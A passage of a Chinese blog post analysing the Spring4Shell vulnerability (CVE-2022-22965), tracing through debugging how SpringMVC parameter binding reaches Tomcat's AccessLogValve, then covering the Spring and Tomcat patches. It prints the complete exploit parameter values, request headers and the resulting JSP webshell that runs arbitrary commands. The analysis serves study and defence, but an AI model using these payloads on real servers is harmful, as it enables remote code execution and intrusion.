+<li>参数值：<code>%&#123;c2&#125;i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i</code></li>
+</ul>
+<p>很明显，这个参数是SpringMVC多层嵌套参数绑定。我们可以推测出如下的调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        ......</span><br><span class="line">            SomeClass.setPattern()</span><br></pre></td></tr></table></figure>
+
+<p>那实际运行过程中的调用链是怎样的呢？<code>SomeClass</code>是哪个类呢？带着这些问题，我们在前置知识中提到的实现SpringMVC参数绑定的主要方法<code>WebDataBinder.doBind(MutablePropertyValues)</code>上设置断点。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228874000-3cpvfu.png-w331s" alt="image"></p>
+<p>经过一系列的调用逻辑后，我们来到<code>AbstractNestablePropertyAccessor</code>第814行，<code>getPropertyAccessorForPropertyPath(String)</code>方法。该方法通过递归调用自身，实现对<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>的递归解析，设置整个调用链。</p>
+<p>我们重点关注第820行，<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>，该行主要实现每层嵌套参数的获取。我们在该行设置断点，查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228875000-4ilmni.png-w331s" alt="image"></p>
+<h4 id="第一轮迭代"><a href="#第一轮迭代" class="headerlink" title="第一轮迭代"></a>第一轮迭代</h4><p>进入<code>getPropertyAccessorForPropertyPath(String)</code>方法前： - <code>this</code>：<code>User</code>的<code>BeanWrapperImpl</code>包装实例 - <code>propertyPath</code>：<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code> - <code>nestedPath</code>：<code>module.classLoader.resources.context.parent.pipeline.first.pattern</code> - <code>nestedProperty</code>：<code>class</code>，即本轮迭代需要解析的嵌套参数</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228875000-5btvip.png-w331s" alt="image"></p>
+<p>进入方法，经过一系列的调用逻辑后，最终来到<code>BeanWrapperImpl</code>第308行，<code>BeanPropertyHandler.getValue()</code>方法中。可以看到<code>class</code>嵌套参数最终通过反射调用<code>User</code>的父类<code>java.lang.Object.getClass()</code>，获得返回<code>java.lang.Class</code>实例。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228876000-6wxqle.png-w331s" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getPropertyAccessorForPropertyPath(String)`方法返回后： - `this`：`User`的`BeanWrapperImpl`包装实例 - `propertyPath`：`class.module.classLoader.resources.context.parent.pipeline.first.pattern` - `nestedPath`：`module.classLoader.resources.context.parent.pipeline.first.pattern`，作为下一轮迭代的`propertyPath` - `nestedProperty`：`class`，即本轮迭代需要解析的嵌套参数 - `nestedPa`：`java.lang.Class`的`BeanWrapperImpl`包装实例，作为下一轮迭代的`this</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228877000-7emhje.png-w331s" alt="image"></p>
+<p>经过第一轮迭代，我们可以得出第一层调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.get???() <span class="comment">// 下一轮迭代实现</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="第二轮迭代"><a href="#第二轮迭代" class="headerlink" title="第二轮迭代"></a>第二轮迭代</h4><p><img src="https://images.seebug.org/content/images/2022/04/06/1649228878000-8chgbm.png-w331s" alt="image"></p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228879000-9gzvlg.png-w331s" alt="image"></p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228880000-10cvorg.png-w331s" alt="image"></p>
+<p><code>module</code>嵌套参数最终通过反射调用<code>java.lang.Class.getModule()</code>，获得返回<code>java.lang.Module</code>实例。</p>
+<p>经过第二轮迭代，我们可以得出第二层调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.get???() <span class="comment">// 下一轮迭代实现</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="第三轮迭代"><a href="#第三轮迭代" class="headerlink" title="第三轮迭代"></a>第三轮迭代</h4><p><img src="https://images.seebug.org/content/images/2022/04/06/1649228882000-11zhlig.png-w331s" alt="image"></p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228883000-12jcrzw.png-w331s" alt="image"></p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228884000-13niqxk.png-w331s" alt="image"></p>
+<p><code>classLoader</code>嵌套参数最终通过反射调用<code>java.lang.Module.getClassLoader()</code>，获得返回<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>实例。</p>
+<p>经过第三轮迭代，我们可以得出第三层调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            org.apache.catalina.loader.ParallelWebappClassLoader.get???() <span class="comment">// 下一轮迭代实现</span></span><br></pre></td></tr></table></figure>
+
+<p>接着按照上述调试方法，依次调试剩余的递归轮次并观察相应的变量，最终可以得到如下完整的调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</span><br><span class="line">                org.apache.catalina.webresources.StandardRoot.getContext()</span><br><span class="line">                    org.apache.catalina.core.StandardContext.getParent()</span><br><span class="line">                        org.apache.catalina.core.StandardHost.getPipeline()</span><br><span class="line">                            org.apache.catalina.core.StandardPipeline.getFirst()</span><br><span class="line">                                org.apache.catalina.valves.AccessLogValve.setPattern()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，<code>pattern</code>参数最终对应<code>AccessLogValve.setPattern()</code>，即将<code>AccessLogValve</code>的<code>pattern</code>属性设置为<code>%&#123;c2&#125;i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i</code>，也就是access_log的文件内容格式。</p>
+<p>我们再来看<code>pattern</code>参数值，除了常规的Java代码外，还夹杂了三个特殊片段。通过翻阅<code>AccessLogValve</code>的父类<code>AbstractAccessLogValve</code>的源码，可以找到相关的文档：</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/598fe68b-b0e7-4f9a-b5be-18a42d50dd17.png-w331s" alt="img"></p>
+<p>即通过<code>AccessLogValve</code>输出的日志中可以通过形如<code>%&#123;param&#125;i</code>等形式直接引用HTTP请求和响应中的内容。完整文档请参考文章末尾的参考章节。</p>
+<p>结合poc.py中<code>headers</code>变量内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;suffix&quot;</span>:<span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>:<span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>:<span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终可以得到<code>AccessLogValve</code>输出的日志实际内容如下（已格式化）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p>很明显，这是一个JSP webshell。这个webshell输出到了哪儿？名称是什么？能被直接访问和正常解析执行吗？我们接下来看其余的参数。</p>
+<h4 id="3-1-2-suffix参数"><a href="#3-1-2-suffix参数" class="headerlink" title="3.1.2 suffix参数"></a>3.1.2 <code>suffix</code>参数</h4><ul>
+<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code></li>
+<li>参数值：<code>.jsp</code></li>
+</ul>
+<p>按照<code>pattern</code>参数相同的调试方法，<code>suffix</code>参数最终将<code>AccessLogValve.suffix</code>设置为<code>.jsp</code>，即access_log的文件名后缀。</p>
+<h4 id="3-1-3-directory参数"><a href="#3-1-3-directory参数" class="headerlink" title="3.1.3 directory参数"></a>3.1.3 <code>directory</code>参数</h4><ul>
+<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.directory</code></li>
+<li>参数值：<code>webapps/ROOT</code></li>
+</ul>
+<p>按照<code>pattern</code>参数相同的调试方法，<code>directory</code>参数最终将<code>AccessLogValve.directory</code>设置为<code>webapps/ROOT</code>，即access_log的文件输出目录。</p>
+<p>这里提下<code>webapps/ROOT</code>目录，该目录为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过<code>http://localhost:8080/</code>根目录访问。</p>
+<h4 id="3-1-4-prefix参数"><a href="#3-1-4-prefix参数" class="headerlink" title="3.1.4 prefix参数"></a>3.1.4 <code>prefix</code>参数</h4><ul>
+<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.prefix</code></li>
+<li>参数值：<code>tomcatwar</code></li>
+</ul>
+<p>按照<code>pattern</code>参数相同的调试方法，<code>prefix</code>参数最终将<code>AccessLogValve.prefix</code>设置为<code>tomcatwar</code>，即access_log的文件名前缀。</p>
+<h4 id="3-1-5-fileDateFormat参数"><a href="#3-1-5-fileDateFormat参数" class="headerlink" title="3.1.5 fileDateFormat参数"></a>3.1.5 <code>fileDateFormat</code>参数</h4><ul>
+<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</code></li>
+<li>参数值：空</li>
+</ul>
+<p>按照<code>pattern</code>参数相同的调试方法，<code>fileDateFormat</code>参数最终将<code>AccessLogValve.fileDateFormat</code>设置为空，即access_log的文件名不包含日期。</p>
+<h4 id="3-1-6-总结"><a href="#3-1-6-总结" class="headerlink" title="3.1.6 总结"></a>3.1.6 总结</h4><p>至此，经过上述的分析，结论非常清晰了：通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat <code>AccessLogValve</code>的属性，让Tomcat在<code>webapps/ROOT</code>目录输出定制的“访问日志”<code>tomcatwar.jsp</code>，该“访问日志”实际上为一个JSP webshell。</p>
+<p>在SpringMVC参数绑定的实际调用链中，有几个关键点直接影响到了漏洞能否成功利用。</p>
+<h3 id="3-2-漏洞利用关键点"><a href="#3-2-漏洞利用关键点" class="headerlink" title="3.2 漏洞利用关键点"></a>3.2 漏洞利用关键点</h3><h4 id="3-2-1-关键点一：Web应用部署方式"><a href="#3-2-1-关键点一：Web应用部署方式" class="headerlink" title="3.2.1 关键点一：Web应用部署方式"></a>3.2.1 关键点一：Web应用部署方式</h4><p>从<code>java.lang.Module</code>到<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，是将调用链转移到Tomcat，并最终利用<code>AccessLogValve</code>输出webshell的关键。</p>
+<p><code>ParallelWebappClassLoader</code>在Web应用以war包部署到Tomcat中时使用到。现在很大部分公司会使用SpringBoot可执行jar包的方式运行Web应用，在这种方式下，我们看下<code>classLoader</code>嵌套参数被解析为什么，如下图：</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228885000-15gfwwg.png-w331s" alt="image"></p>
+<p>可以看到，使用SpringBoot可执行jar包的方式运行，<code>classLoader</code>嵌套参数被解析为<code>org.springframework.boot.loader.LaunchedURLClassLoader</code>，查看其源码，没有<code>getResources()</code>方法。具体源码请参考文章末尾的参考章节。</p>
+<p>这就是为什么本漏洞利用条件之一，Web应用部署方式需要是Tomcat war包部署。</p>
+<h4 id="3-2-2-关键点二：JDK版本"><a href="#3-2-2-关键点二：JDK版本" class="headerlink" title="3.2.2 关键点二：JDK版本"></a>3.2.2 关键点二：JDK版本</h4><p>在前面章节中<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>调用的过程中，实际上Spring做了一道防御。</p>
+<p>Spring使用<code>org.springframework.beans.CachedIntrospectionResults</code>缓存并返回Java Bean中可以被<code>BeanWrapperImpl</code>使用的<code>PropertyDescriptor</code>。在<code>CachedIntrospectionResults</code>第289行构造方法中：</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228886000-16ewyaz.png-w331s" alt="image"></p>
+<p>该行的意思是：当Bean的类型为<code>java.lang.Class</code>时，不返回<code>classLoader</code>和<code>protectionDomain</code>的<code>PropertyDescriptor</code>。Spring在构建嵌套参数的调用链时，会根据<code>CachedIntrospectionResults</code>缓存的<code>PropertyDescriptor</code>进行构建：</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228887000-17stdlu.png-w331s" alt="image"></p>
+<p>不返回，也就意味着<code>class.classLoader...</code>这种嵌套参数走不通，即形如下方的调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getClassLoader()</span><br><span class="line">        BarClassLoader.getBaz()</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>
+
+<p>这在JDK&lt;&#x3D;1.8都是有效的。但是在JDK 1.9之后，Java为了支持模块化，在<code>java.lang.Class</code>中增加了<code>module</code>属性和对应的<code>getModule()</code>方法，自然就能通过如下调用链绕过判断：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getModule() <span class="comment">// 绕过</span></span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            BarClassLoader.getBaz()</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure>
+
+<p>这就是为什么本漏洞利用条件之二，JDK&gt;&#x3D;1.9。</p>
+<h2 id="四、补丁分析"><a href="#四、补丁分析" class="headerlink" title="四、补丁分析"></a>四、补丁分析</h2><h3 id="4-1-Spring-5-3-18补丁"><a href="#4-1-Spring-5-3-18补丁" class="headerlink" title="4.1 Spring 5.3.18补丁"></a>4.1 Spring 5.3.18补丁</h3><p>通过对比Spring 5.3.17和5.3.18的版本，可以看到在3月31日有一项名为“Redefine PropertyDescriptor filter的”提交。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228887000-18iwnlm.png-w331s" alt="image"></p>
+<p>进入该提交，可以看到对<code>CachedIntrospectionResults</code>构造函数中Java Bean的<code>PropertyDescriptor</code>的过滤条件被修改了：当Java Bean的类型为<code>java.lang.Class</code>时，仅允许获取<code>name</code>以及<code>Name</code>后缀的属性描述符。在章节<code>3.2.2 关键点二：JDK版本</code>中，利用<code>java.lang.Class.getModule()</code>的链路就走不通了。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228888000-19qrkrw.png-w331s" alt="image"></p>
+<h3 id="4-2-Tomcat-9-0-62补丁"><a href="#4-2-Tomcat-9-0-62补丁" class="headerlink" title="4.2 Tomcat 9.0.62补丁"></a>4.2 Tomcat 9.0.62补丁</h3><p>通过对比Tomcat 9.0.61和9.0.62的版本，可以看到在4月1日有一项名为“Security hardening. Deprecate getResources() and always return null.”提交。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228888000-20muaoq.png-w331s" alt="image"></p>
+<p>进入该提交，可以看到对<code>getResource()</code>方法的返回值做了修改，直接返回<code>null</code>。<code>WebappClassLoaderBase</code>即<code>ParallelWebappClassLoader</code>的父类，在章节<code>3.2.1 关键点一：Web应用部署方式</code>中，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。</p>
+<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228888000-21irivm.png-w331s" alt="image"></p>
+<h2 id="五、思考"><a href="#五、思考" class="headerlink" title="五、思考"></a>五、思考</h2><p>通过将代码输出到日志文件，并控制日志文件被解释执行，这在漏洞利用方法中也较为常见。通常事先往服务器上写入包含代码的“日志”文件，并利用文件包含漏洞解释执行该“日志”文件。写入“日志”文件可以通过Web服务中间件自身的日志记录功能顺带实现，也可以通过SQL注入、文件上传漏洞等曲线实现。</p>
+<p>与上文不同的是，本次漏洞并不需要文件包含。究其原因，Java Web服务中间件自身也是用Java编写和运行的，而部署运行在上面的Java Web应用，实际上是Java Web服务中间件进程的一部分，两者间通过Servlet API标准接口在进程内部进行“通讯”。依靠Java语言强大的运行期反射能力，给予了攻击者可以通过Java Web应用漏洞进而攻击Java Web服务中间件的能力。也就是本次利用Web应用自身的Spring漏洞，进而修改了Web服务中间件Tomcat的access_log配置内容，直接输出可执行的“日志”文件到Web 应用目录下。</p>
+<p>在日常开发中，应该严格控制Web应用可解释执行目录为只读不可写，日志、上传文件等运行期可以修改的目录应该单独设置，并且不可执行。</p>
+<p>本次漏洞虽然目前调用链中仅利用到了Tomcat，但只要存在一个从Web应用到Web服务中间件的<code>class.module.classLoader....</code>合适调用链，理论上Jetty、Weblogic、Glassfish等也可利用。另外，目前通过写入日志文件的方式，也可能通过其它文件，比如配置文件，甚至是内存马的形式出现。</p>
+<p>本次漏洞目前唯一令人“欣慰”的一点是，仅对JDK&gt;&#x3D;1.9有效。相信不少公司均为“版本任你发，我用Java 8！”的状态，但这也仅仅是目前。与其抱着侥幸心理，不如按计划老老实实升级Spring。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li>Tomcat access_log配置参考文档：<a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging">https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</a></li>
+<li>Spring 5.3.17和5.3.18版本比较：<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18">https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18</a></li>
+<li>Spring 5.3.18补丁提交内容：<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15">https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</a></li>
+<li>Tomcat 9.0.61和9.0.62版本比较：<a target="_blank" rel="noopener" href="https://github.com/apache/tomcat/compare/9.0.61...9.0.62">https://github.com/apache/tomcat/compare/9.0.61...9.0.62</a></li>
+<li>Tomcat 9.0.62补丁提交内容：<a target="_blank" rel="noopener" href="https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c">https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c</a></li>
+<li>LaunchedURLClassLoader源码：<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java">https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2024/01/19/Spring4Shell%E6%BC%8F%E6%B4%9E/" class="leancloud-visitors view" data-flag-title="Spring4Shell漏洞(CVE-2022-22965)原理分析">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/01/16/JNDI注入/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/CVE/">CVE<span>11</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web/">web<span>69</span></a></li> <li><a href="/tags/unserialize/">unserialize<span>16</span></a></li> <li><a href="/tags/java/">java<span>6</span></a></li> <li><a href="/tags/spring/">spring<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
